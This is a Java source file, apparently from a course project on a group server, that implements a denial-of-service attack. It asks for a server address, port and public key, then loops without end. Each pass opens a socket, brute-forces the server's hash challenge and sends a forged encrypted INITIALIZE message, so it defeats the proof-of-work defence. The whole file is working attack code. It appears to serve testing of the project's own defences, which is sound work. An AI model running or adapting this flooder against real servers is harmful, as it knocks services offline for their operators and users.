
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.security.GeneralSecurityException;
import java.security.PublicKey;
import java.util.LinkedList;
import java.util.List;
import java.util.Scanner;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import other.CryptographicFunctions;
import other.Envelope;

/**
 *
 * @author Jack Ullery
 */
public class RunDosAttack {

    public static void main(String[] args) throws IOException, GeneralSecurityException, ClassNotFoundException {

        LinkedList<Socket> list = new LinkedList<>();
        Scanner input = new Scanner(System.in);

        System.out.println("Before we run the DOS attack...");
        System.out.printf("Please enter the ip address of the group server: ");
        String server = input.nextLine();

        System.out.print("Please enter the open port: ");
        int port = Integer.parseInt(input.nextLine());

        System.out.print("Please enter the public key: ");
        PublicKey pk = CryptographicFunctions.decodePublicRSAKey(input.nextLine());

        System.out.println("Starting DOS attack...");
        Socket sock;

        Envelope fakeMessage = fakeMessage(pk);
        while (true) {
            sock = new Socket(server, port);
            dosAttackNew(sock, fakeMessage);
        }
    }

    private static void dosAttackNaive(Socket sock, Envelope fakeMessage) throws IOException {
        (new ObjectOutputStream(sock.getOutputStream())).writeObject(fakeMessage);
    }

    private static void dosAttackNew(Socket sock, Envelope fakeMessage) throws IOException, ClassNotFoundException {
        ObjectOutputStream output = new ObjectOutputStream(sock.getOutputStream());
        ObjectInputStream input = new ObjectInputStream(sock.getInputStream());
        solveChallenge(output, input);
        output.writeObject(fakeMessage);
    }

    private static void solveChallenge(ObjectOutputStream output, ObjectInputStream input) throws IOException, ClassNotFoundException {
        Envelope challengeMsg = (Envelope) input.readObject();
        List<Object> objects = challengeMsg.getObjContents();
        if (challengeMsg.getMessage().equals("CHALLENGE")
                && objects != null && objects.size() == 3
                && objects.get(0) instanceof byte[]
                && objects.get(1) instanceof byte[]
                && objects.get(2) instanceof Integer) {

            byte[] challenge = (byte[]) objects.get(0);
            byte[] salt = (byte[]) objects.get(1);
            Integer size = (Integer) objects.get(2);

            byte[] hash = CryptographicFunctions.bruteForceHash(challenge, salt, size);

            Envelope solution = new Envelope("RESPONSE");
            solution.addObject(hash);
            output.writeObject(solution);
        }
    }

    private static Envelope fakeMessage(PublicKey publicKey) throws GeneralSecurityException {
        Cipher rsaEncryptionCipher = CryptographicFunctions.createEncryptionCipher(publicKey);
        SecretKey symmetricKey = CryptographicFunctions.generateAESKey();
        SecretKey authenticationKey = CryptographicFunctions.generateAESKey();
        return createMessage("INITIALIZE", new Object[]{symmetricKey, authenticationKey}, rsaEncryptionCipher);
    }

    private static Envelope createMessage(String operation, Object[] args, Cipher ciper) {
        Envelope message;
        message = new Envelope(operation);
        for (Object elem : args) {
            message.addObject(elem);
        }
        return (Envelope.encryptEnvelope(message, ciper));
    }
}
